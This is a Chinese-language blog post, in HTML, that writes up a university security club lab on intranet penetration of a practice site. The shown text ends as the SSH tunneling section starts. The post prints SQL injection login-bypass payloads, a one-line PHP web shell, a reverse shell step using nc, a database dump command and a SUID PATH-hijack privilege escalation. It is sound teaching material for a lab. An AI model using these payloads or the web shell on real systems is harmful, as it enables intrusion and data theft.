@@ -1,0 +1,485 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>[NSYSU 資安社課] Intranet Penetration - Cyris&#39;s Blog</title><meta name="Description" content="This is Cyris&#39;s blog, recording life and sharing security learning."><meta property="og:url" content="https://blog.cyris.tw/posts/2022/nsysuisc-intranet-penetration/">
+  <meta property="og:site_name" content="Cyris&#39;s Blog">
+  <meta property="og:title" content="[NSYSU 資安社課] Intranet Penetration">
+  <meta property="og:description" content="久違的社課，這次是 MacacaHub 現役成員 @Arikoi 談內網滲透。
+整場聽下來發現自己太多觀念不熟，所以盡可能將過程整理，有任何錯誤還請不吝指教！">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2022-04-21T00:00:00+00:00">
+    <meta property="article:modified_time" content="2022-04-21T00:00:00+00:00">
+    <meta property="article:tag" content="NSYSUISC 中山資安社">
+    <meta property="article:tag" content="Intranet Penetration">
+    <meta property="og:image" content="https://blog.cyris.tw/img/cyris.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://blog.cyris.tw/img/cyris.png">
+  <meta name="twitter:title" content="[NSYSU 資安社課] Intranet Penetration">
+  <meta name="twitter:description" content="久違的社課，這次是 MacacaHub 現役成員 @Arikoi 談內網滲透。
+整場聽下來發現自己太多觀念不熟，所以盡可能將過程整理，有任何錯誤還請不吝指教！">
+      <meta name="twitter:site" content="@yctseng1227">
+<meta name="application-name" content="Cyris&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Cyris&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/img/favicon.ico"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://blog.cyris.tw/posts/2022/nsysuisc-intranet-penetration/" /><link rel="prev" href="https://blog.cyris.tw/posts/2021/hitcon2021-devcore-web-challenge/" /><link rel="next" href="https://blog.cyris.tw/posts/2023/2023h1-sharing/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "[NSYSU 資安社課] Intranet Penetration",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/blog.cyris.tw\/posts\/2022\/nsysuisc-intranet-penetration\/"
+        },"image": ["https:\/\/blog.cyris.tw\/img\/cyris.png"],"genre": "posts","keywords": "NSYSUISC 中山資安社, Intranet Penetration","wordcount":  607 ,
+        "url": "https:\/\/blog.cyris.tw\/posts\/2022\/nsysuisc-intranet-penetration\/","datePublished": "2022-04-21T00:00:00+00:00","dateModified": "2022-04-21T00:00:00+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "Cyris","logo": "https:\/\/blog.cyris.tw\/img\/cyris.png"},"author": {
+                "@type": "Person",
+                "name": "Cyris"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="auto" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Cyris&#39;s Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/img/favicon.ico"
+        data-srcset="/img/favicon.ico, /img/favicon.ico 1.5x, /img/favicon.ico 2x"
+        data-sizes="auto"
+        alt="/img/favicon.ico"
+        title="/img/favicon.ico" />Cyris&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><a href="#" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Cyris&#39;s Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/img/favicon.ico"
+        data-srcset="/img/favicon.ico, /img/favicon.ico 1.5x, /img/favicon.ico 2x"
+        data-sizes="auto"
+        alt="/img/favicon.ico"
+        title="/img/favicon.ico" />Cyris&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="#" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">[NSYSU 資安社課] Intranet Penetration</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://blog.cyris.tw" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Cyris</a></span>&nbsp;<span class="post-category">included in <a href="/categories/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8-cyber-security/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>資訊安全 Cyber Security</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-04-21">2022-04-21</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;607 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;3 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#事前資訊">事前資訊</a></li>
+    <li><a href="#網站資訊收集">網站資訊收集</a>
+      <ul>
+        <li><a href="#sql-injection">SQL Injection</a></li>
+        <li><a href="#unrestricted-file-upload">Unrestricted File Upload</a></li>
+        <li><a href="#reverse-shell">Reverse Shell</a></li>
+        <li><a href="#suid-privilege-escalation">SUID Privilege Escalation</a></li>
+      </ul>
+    </li>
+    <li><a href="#內網滲透">內網滲透</a>
+      <ul>
+        <li><a href="#ssh-tunneling">SSH Tunneling</a>
+          <ul>
+            <li><a href="#dynamic-port-forwarding">Dynamic Port Forwarding</a></li>
+          </ul>
+        </li>
+        <li><a href="#proxychains">ProxyChains</a></li>
+      </ul>
+    </li>
+    <li><a href="#bonus">Bonus</a>
+      <ul>
+        <li><a href="#another-privilege-escalation">Another Privilege Escalation</a></li>
+      </ul>
+    </li>
+    <li><a href="#後記">後記</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>久違的社課，這次是 <strong>MacacaHub</strong> 現役成員 @Arikoi 談內網滲透。<br>
+整場聽下來發現自己太多觀念不熟，所以盡可能將過程整理，有任何錯誤還請不吝指教！</p>
+<h2 id="事前資訊">事前資訊</h2>
+<p>由於這堂某種程度算是內網滲透的簡單範例，所以開頭就給了不少資訊。
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650623224/blog-posts/2022-04/21-info-1_n7oj2p.webp"
+        data-srcset="https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650623224/blog-posts/2022-04/21-info-1_n7oj2p.webp, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650623224/blog-posts/2022-04/21-info-1_n7oj2p.webp 1.5x, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650623224/blog-posts/2022-04/21-info-1_n7oj2p.webp 2x"
+        data-sizes="auto"
+        alt="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650623224/blog-posts/2022-04/21-info-1_n7oj2p.webp"
+        title=" " /></p>
+<h2 id="網站資訊收集">網站資訊收集</h2>
+<p>出發點是一個簡陋的網站，從選單可以簡單知道該站的基本功能，同時發現 FileUpload 不開放給非 admin 使用者。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650544772/blog-posts/2022-04/21-index_kngc2y.webp"
+        data-srcset="https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650544772/blog-posts/2022-04/21-index_kngc2y.webp, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650544772/blog-posts/2022-04/21-index_kngc2y.webp 1.5x, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650544772/blog-posts/2022-04/21-index_kngc2y.webp 2x"
+        data-sizes="auto"
+        alt="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650544772/blog-posts/2022-04/21-index_kngc2y.webp"
+        title=" " /></p>
+<h3 id="sql-injection">SQL Injection</h3>
+<p>首先我們可以從登入下手，會被導去一個登入頁（沿用之前的社課教材XD），很明顯是個 SQLi 的洞，還附了 Magic 給你 debug。 這時講師提供了一組 <code>guest:guest</code> 作為提示，登入後可以發現上方會是 &ldquo;Welcome guest&rdquo;。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650623566/blog-posts/2022-04/21-index-guest_i9rqap.webp"
+        data-srcset="https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650623566/blog-posts/2022-04/21-index-guest_i9rqap.webp, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650623566/blog-posts/2022-04/21-index-guest_i9rqap.webp 1.5x, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650623566/blog-posts/2022-04/21-index-guest_i9rqap.webp 2x"
+        data-sizes="auto"
+        alt="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650623566/blog-posts/2022-04/21-index-guest_i9rqap.webp"
+        title=" " /></p>
+<p>如果用 <code>' or 1=1 -- </code> 可以成功登入，但是由於 admin 並不在資料庫第一筆，因此就算條件為 True 也不會是以 admin 登入。這邊的考點要用 <code>UNION</code> 的方式繞過，但講師把驗證的部分寫壞了，所以 <code>admin'; -- </code> 可以繞過XD</p>
+<p>預期解法可以用 <code>LIMIT 1,1 -- </code> 找下一筆查詢結果，或是用 <code>UNION</code> 猜欄位數量後，再透過 &ldquo;Welcome <user>&rdquo; 來判斷要把 admin 塞在哪一個位置（<del>當然全塞也是會過啦</del>），密碼可留空。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="s1">&#39;UNION SELECT &#39;</span><span class="n">a</span><span class="s1">&#39;, &#39;</span><span class="n">admin</span><span class="s1">&#39;, &#39;</span><span class="n">a</span><span class="s1">&#39; ; --
+</span></span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650623566/blog-posts/2022-04/21-index-admin_njth3e.webp"
+        data-srcset="https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650623566/blog-posts/2022-04/21-index-admin_njth3e.webp, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650623566/blog-posts/2022-04/21-index-admin_njth3e.webp 1.5x, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650623566/blog-posts/2022-04/21-index-admin_njth3e.webp 2x"
+        data-sizes="auto"
+        alt="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650623566/blog-posts/2022-04/21-index-admin_njth3e.webp"
+        title=" " /></p>
+<h3 id="unrestricted-file-upload">Unrestricted File Upload</h3>
+<p>成功以 admin 登入，下一步可以嘗試上傳檔案。</p>
+<p>該功能的用途是上傳圖片並顯示在首頁中，因此若非允許的副檔名會被擋下來。<br>
+<del>給各位參考資安社社員們都傳了什麼圖www</del></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650544772/blog-posts/2022-04/21-index-isc_csjua0.webp"
+        data-srcset="https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650544772/blog-posts/2022-04/21-index-isc_csjua0.webp, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650544772/blog-posts/2022-04/21-index-isc_csjua0.webp 1.5x, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650544772/blog-posts/2022-04/21-index-isc_csjua0.webp 2x"
+        data-sizes="auto"
+        alt="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650544772/blog-posts/2022-04/21-index-isc_csjua0.webp"
+        title=" " /></p>
+<p>上傳後的圖片在首頁點開會發現路徑存在 <code>./uploads/&lt;filename&gt;.jpg</code>。<br>
+用 F12 可以從前端找到前端驗證 <code>fileValidation.js</code> ，從 source code 可以想到要繞過驗證並嘗試上傳 web shell。（原本在驗題的時候函式似乎沒有放 <code>const</code> ，所以可以直接從前端拔掉驗證的部分XD）</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650545038/blog-posts/2022-04/21-upload_lgdmpn.webp"
+        data-srcset="https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650545038/blog-posts/2022-04/21-upload_lgdmpn.webp, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650545038/blog-posts/2022-04/21-upload_lgdmpn.webp 1.5x, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650545038/blog-posts/2022-04/21-upload_lgdmpn.webp 2x"
+        data-sizes="auto"
+        alt="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650545038/blog-posts/2022-04/21-upload_lgdmpn.webp"
+        title=" " /></p>
+<p>web shell 的部分並沒有擋太多，用最簡單的 PHP web shell 就行了（副檔名為 <code>.png</code>）。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nx">shell_exec</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">],</span> <span class="s1">&#39;2&gt;&amp;1&#39;</span><span class="p">);</span>
+</span></span></code></pre></div><p>驗證繞過的部分，預期解是直接開 Burp Suite 攔截修改副檔名即可。</p>
+<blockquote>
+<p>題外話，最新版的 Burp Suite 居然有內建 chrominum 不用另外設定 proxy ，大推!!</p>
+</blockquote>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650544772/blog-posts/2022-04/21-burp_uxt84r.webp"
+        data-srcset="https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650544772/blog-posts/2022-04/21-burp_uxt84r.webp, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650544772/blog-posts/2022-04/21-burp_uxt84r.webp 1.5x, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650544772/blog-posts/2022-04/21-burp_uxt84r.webp 2x"
+        data-sizes="auto"
+        alt="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650544772/blog-posts/2022-04/21-burp_uxt84r.webp"
+        title=" " /></p>
+<p>之後可以透過剛剛上傳的檔案路徑執行我們的 web shell。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650545038/blog-posts/2022-04/21-webshell-whoami_fhxlks.webp"
+        data-srcset="https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650545038/blog-posts/2022-04/21-webshell-whoami_fhxlks.webp, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650545038/blog-posts/2022-04/21-webshell-whoami_fhxlks.webp 1.5x, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650545038/blog-posts/2022-04/21-webshell-whoami_fhxlks.webp 2x"
+        data-sizes="auto"
+        alt="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650545038/blog-posts/2022-04/21-webshell-whoami_fhxlks.webp"
+        title=" " />
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650545038/blog-posts/2022-04/21-webshell-ls_d7fw7a.webp"
+        data-srcset="https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650545038/blog-posts/2022-04/21-webshell-ls_d7fw7a.webp, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650545038/blog-posts/2022-04/21-webshell-ls_d7fw7a.webp 1.5x, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650545038/blog-posts/2022-04/21-webshell-ls_d7fw7a.webp 2x"
+        data-sizes="auto"
+        alt="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650545038/blog-posts/2022-04/21-webshell-ls_d7fw7a.webp"
+        title=" " /></p>
+<h3 id="reverse-shell">Reverse Shell</h3>
+<p>用 web shell 雖然可以下指令翻閱 web server 底下的檔案，但並不會保留 session ，因此沒辦法 <code>cd</code> 到其他路徑。甚至是在 <code>cat</code> 一些 php 檔案也不會直接顯示 source code ，這時候就可以用 Reverse Shell 的方式讓 web server 主動向我們連線。</p>
+<p>這裡使用 <a href="https://www.revshells.com/" target="_blank" rel="noopener noreffer ">Reverse Shell Generator</a> 自動產生連線所需要的 code ，要注意的是若沒有實體 IP 的話，講師當時有提供 Kali 可以 SSH 進去用內網 IP（這部分我使用實驗室的實體 IP）。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650544772/blog-posts/2022-04/21-revshell-gen_k2fdcr.webp"
+        data-srcset="https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650544772/blog-posts/2022-04/21-revshell-gen_k2fdcr.webp, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650544772/blog-posts/2022-04/21-revshell-gen_k2fdcr.webp 1.5x, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650544772/blog-posts/2022-04/21-revshell-gen_k2fdcr.webp 2x"
+        data-sizes="auto"
+        alt="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650544772/blog-posts/2022-04/21-revshell-gen_k2fdcr.webp"
+        title=" " /></p>
+<p>在 Host 使用右上的指令進行 LISTEN。<br>
+在 web shell 使用下方的指令，左側可以依據 server 選擇連線工具（有時候需要多測幾個，這裡用 <code>nc -c</code> 可以成功連線）。</p>
+<p>成功的話 Local 就會彈出 Reverse Shell ，可以下一些指令挖看看有什麼有趣的資訊。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650624037/blog-posts/2022-04/21-revshell-ls_nt0lqn.webp"
+        data-srcset="https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650624037/blog-posts/2022-04/21-revshell-ls_nt0lqn.webp, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650624037/blog-posts/2022-04/21-revshell-ls_nt0lqn.webp 1.5x, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650624037/blog-posts/2022-04/21-revshell-ls_nt0lqn.webp 2x"
+        data-sizes="auto"
+        alt="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650624037/blog-posts/2022-04/21-revshell-ls_nt0lqn.webp"
+        title=" " /></p>
+<p>可以發現一些網站的 source code，其中在 <code>login.php</code> 可以進一步翻到寫在 <code>connect.php</code> 的 資料庫 資訊。 有了資料庫的登入資訊，也確認有 <code>mysql</code> 可用，就可以直接用指令翻資料庫的內容了，格式如下。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ mysql –h SERVER –u USER –pPASSWORD DATABASE -e <span class="s2">&#34;show tables;&#34;</span>
+</span></span></code></pre></div><div class="details admonition warning open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-exclamation-triangle fa-fw" aria-hidden="true"></i>關於 `mysql` 幾個雷點<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><ol>
+<li>密碼的部分 <code>-pPASSWORD</code> 中間沒有空白。</li>
+<li>由於指令打錯不會噴任何訊息，建議要加 <code>-e &quot;&lt;command&gt;;&quot;</code>，同時分號記得掛上去。</li>
+</ol>
+</div>
+        </div>
+    </div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650624413/blog-posts/2022-04/21-revshell-mysql_xcyhmd.webp"
+        data-srcset="https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650624413/blog-posts/2022-04/21-revshell-mysql_xcyhmd.webp, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650624413/blog-posts/2022-04/21-revshell-mysql_xcyhmd.webp 1.5x, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650624413/blog-posts/2022-04/21-revshell-mysql_xcyhmd.webp 2x"
+        data-sizes="auto"
+        alt="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650624413/blog-posts/2022-04/21-revshell-mysql_xcyhmd.webp"
+        title=" " /></p>
+<blockquote>
+<p>MacacaHub{db-secret-2553a38af63eb376ba770668e81045dc}</p>
+</blockquote>
+<p>在資料庫除了拿到 Flag， 還順便撿到了一組可登入的使用者 <code>macaca:mhub</code>（關於這個使用者的存在，可以透過指令 <code>last</code> 或 <code>/etc/passwd</code> 觀察）。</p>
+<div class="details admonition danger open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-skull-crossbones fa-fw" aria-hidden="true"></i>危險<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">弱密碼 Bad ， 而且資料庫勿存密碼明文。</div>
+        </div>
+    </div>
+<p>另外還可以用 <code>ip addr</code> 瞭解網卡資訊，可以看到除了目前網段 <code>10.0.20.0/24</code> ，還有之後會用到內網網段 <code>10.255.0.0/24</code>。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650624810/blog-posts/2022-04/21-revshell-ip_s40scn.webp"
+        data-srcset="https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650624810/blog-posts/2022-04/21-revshell-ip_s40scn.webp, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650624810/blog-posts/2022-04/21-revshell-ip_s40scn.webp 1.5x, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650624810/blog-posts/2022-04/21-revshell-ip_s40scn.webp 2x"
+        data-sizes="auto"
+        alt="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650624810/blog-posts/2022-04/21-revshell-ip_s40scn.webp"
+        title=" " /></p>
+<h3 id="suid-privilege-escalation">SUID Privilege Escalation</h3>
+<p>在 web server 裡除了一些 PHP 的 source code，還有一個令人感興趣的 <code>.c</code>，這個其實是能在 Linux 利用環境變數的 SUID 提權，但有鑒於社課時間不夠，這部分就被講師跳過了有點可惜QQ 有興趣可以參考 <a href="https://mochazz.github.io/2018/06/09/Linux%E6%8F%90%E6%9D%83%E4%B9%8BSUID/#%E4%BB%8B%E7%BB%8D" target="_blank" rel="noopener noreffer ">Linux提权之SUID</a></p>
+<p>起手式，檢查有沒有奇怪的檔案，這裡用 <code>find</code> 找到具有 SUID 權限的程式 <code>showErrorLog</code>。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ find . -perm -u<span class="o">=</span>s -type f 2&gt;/dev/null
+</span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650621046/blog-posts/2022-04/21-suid-pe-1_q0jac3.webp"
+        data-srcset="https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650621046/blog-posts/2022-04/21-suid-pe-1_q0jac3.webp, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650621046/blog-posts/2022-04/21-suid-pe-1_q0jac3.webp 1.5x, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650621046/blog-posts/2022-04/21-suid-pe-1_q0jac3.webp 2x"
+        data-sizes="auto"
+        alt="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650621046/blog-posts/2022-04/21-suid-pe-1_q0jac3.webp"
+        title=" " /></p>
+<p>根據講師提供 <code>.c</code> source code，可以發現程式為了用 <code>tail</code> 存取 <code>/var/log/</code> 底下需要 root 權限的檔案，前面掛上了 SUID 。 這時候我們可以利用偽造 <code>tail</code> 並加入環境變數的方式，讓  <code>showErrorLog</code> 執行我們想要的指令，具體作法如下。</p>
+<ol>
+<li>找一個可以寫入的目錄，最常被拿來寫入的是 <code>/tmp</code> ，因此我們把 &ldquo;<code>/bin/bash</code>&rdquo; 寫進 <code>/tmp/tail</code>，並寫給他執行權限 777（或是 +x 也行）。</li>
+<li>把目錄 <code>/tmp</code> 寫進環境變數 <code>$PATH</code>。</li>
+</ol>
+<p>如此一來，執行 <code>showErrorLog</code> 後系統會先找到存放在 <code>/tmp</code> 的 <code>tail</code>，並且執行 <code>/bin/bash</code> ，直接取得 root 的 shell !!</p>
+<blockquote>
+<p>下圖為了方便截圖，重開新的 session，並分段提高可讀性（Ｏ</p>
+</blockquote>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650621046/blog-posts/2022-04/21-suid-pe-2_t9a3rb.webp"
+        data-srcset="https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650621046/blog-posts/2022-04/21-suid-pe-2_t9a3rb.webp, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650621046/blog-posts/2022-04/21-suid-pe-2_t9a3rb.webp 1.5x, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650621046/blog-posts/2022-04/21-suid-pe-2_t9a3rb.webp 2x"
+        data-sizes="auto"
+        alt="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650621046/blog-posts/2022-04/21-suid-pe-2_t9a3rb.webp"
+        title=" " /></p>
+<p>找到在 <code>/root</code> 偷埋的 flag。</p>
+<blockquote>
+<p>MacacaHub{env-privilege-b68a4679b5a2e1aaa00dc3ffa8ed429c}</p>
+</blockquote>
+<h2 id="內網滲透">內網滲透</h2>
+<h3 id="ssh-tunneling">SSH Tunneling</h3>
+<p>一般來說，SSH 是被允許通過防火牆或是 DMZ ，而且 SSH 的傳輸過程都是加密的，因此很容易被駭客拿來利用，在這次社課主要就是以 SSH Tunneling 搭配之後的 ProxyChains 來透過 web server 進入內網。關於 SSH Tunneling 這裡只介紹 Dynamic Port Forwarding，其他有興趣的可以參考 <a href="https://johnliu55.tw/ssh-tunnel.html" target="_blank" rel="noopener noreffer ">SSH Tunneling (Port Forwarding) 詳解</a>。</p>
